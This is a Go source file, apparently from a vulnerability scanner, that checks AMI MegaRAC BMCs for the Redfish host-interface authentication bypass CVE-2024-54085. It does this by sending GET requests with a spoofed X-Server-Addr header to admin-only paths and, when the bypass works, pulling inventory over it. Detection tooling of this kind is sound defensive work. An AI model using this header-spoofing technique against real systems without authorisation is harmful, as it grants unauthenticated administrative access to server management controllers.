package redfish

import (
	"net/http"
	"time"
)

// CVE-2024-54085 is the AMI MegaRAC SPx Redfish Host-Interface authentication
// bypass: the router derives "this came from the internal host interface" from a
// caller-supplied X-Server-Addr header, so any remote client that sets it to the
// internal address skips authentication.
//
// This probe never writes. An admin-scoped resource denied anonymously must return
// a genuine Redfish document once the spoofed header is added; only then is the
// bypass asserted. probe.go carries the cheap identify-time detector; this file is
// the admin-scoped confirmation the check layer asserts on.
//
// Known false-negative bounds (the Host-header fallback is reported as
// CVE-2023-34329 instead; the trusted address is read from Redis and a non-default
// one is not remotely enumerable): kb/ami/.

// HostInterfaceAddr is the internal Redfish Host-Interface (USB0) address the
// vulnerable routing layer trusts.
const HostInterfaceAddr = "169.254.0.17"

// hostIfaceHeader is the caller-supplied header the vulnerable build reads to
// decide the request originated on the host interface.
const hostIfaceHeader = "X-Server-Addr"

// hostIfaceSpoofValues are the header values tried, published form first.
// MegaRAC formats the local address as "addr:port"; the published PoC supplies
// an empty port ("169.254.0.17:") and some builds compare the bare address.
var hostIfaceSpoofValues = []string{HostInterfaceAddr + ":", HostInterfaceAddr}

// hostIfaceAdminPaths are the admin-scoped resources used for the differential,
// in the same order AuthedResource uses: Accounts is admin-only on every
// compliant BMC, Managers is the fallback for builds that gate Accounts
// differently but serve Managers to an authenticated principal.
var hostIfaceAdminPaths = []string{"/redfish/v1/AccountService/Accounts", "/redfish/v1/Managers"}

// HostIfaceBypassResult is the outcome of the admin-scoped CVE-2024-54085
// differential. Confirmed is true only when an anonymously-denied admin
// resource was served once the spoofed header was added.
type HostIfaceBypassResult struct {
	Confirmed   bool
	Path        string     // admin resource the differential ran against
	HeaderName  string     // "X-Server-Addr"
	HeaderValue string     // spoof value that worked (or was last tried)
	PlainStatus int        // status without the header (expected 401/403)
	SpoofStatus int        // status with the header injected
	Info        SystemInfo // inventory pulled over the bypassed path, on success
	Snippet     string     // bounded preview of the bypassed response body
}

// Header renders the full spoofed request header for evidence output.
func (r HostIfaceBypassResult) Header() string {
	return r.HeaderName + ": " + r.HeaderValue
}

// CheckHostInterfaceBypass runs the CVE-2024-54085 admin-scoped differential
// against one Redfish HTTPS port. It is read-only: GETs only, never the
// account-creation POST. It does not validate write access.
func CheckHostInterfaceBypass(host string, port int, timeout time.Duration) HostIfaceBypassResult {
	return checkHostInterfaceBypass(insecureClient(nil, timeout), baseURL(host, port), timeout)
}

func checkHostInterfaceBypass(client *http.Client, base string, timeout time.Duration) HostIfaceBypassResult {
	res := HostIfaceBypassResult{HeaderName: hostIfaceHeader}
	for _, path := range hostIfaceAdminPaths {
		plainStatus, plainBody := authGet(client, base+path, nil, timeout)
		if plainStatus == 0 {
			return res // port not answering; nothing to attribute
		}
		if isRedfishDoc(plainStatus, plainBody) {
			// Served to an anonymous caller with no header at all: a pre-auth
			// exposure, but not attributable to the header bypass. Fall through to
			// the next resource rather than claiming the CVE.
			continue
		}
		for _, val := range hostIfaceSpoofValues {
			headers := map[string]string{hostIfaceHeader: val}
			spoofStatus, spoofBody := authGet(client, base+path, headers, timeout)
			if !isRedfishDoc(spoofStatus, spoofBody) {
				res.Path, res.HeaderValue = path, val
				res.PlainStatus, res.SpoofStatus = plainStatus, spoofStatus
				continue
			}
			res.Confirmed = true
			res.Path, res.HeaderValue = path, val
			res.PlainStatus, res.SpoofStatus = plainStatus, spoofStatus
			res.Snippet = bypassSnippet(spoofBody)
			// Pull inventory over the same bypassed request path (the header
			// carries the forged identity, so no token or credential is involved).
			res.Info = PullSystemInfo(client, base, headers, "", timeout)
			return res
		}
	}
	return res
}

// isRedfishDoc reports whether a response is a served Redfish resource rather
// than a denial or an HTML login page returned with a 200.
func isRedfishDoc(status int, body []byte) bool {
	return status >= 200 && status < 300 && looksLikeRedfish(body) && !looksLikeLogin(body)
}
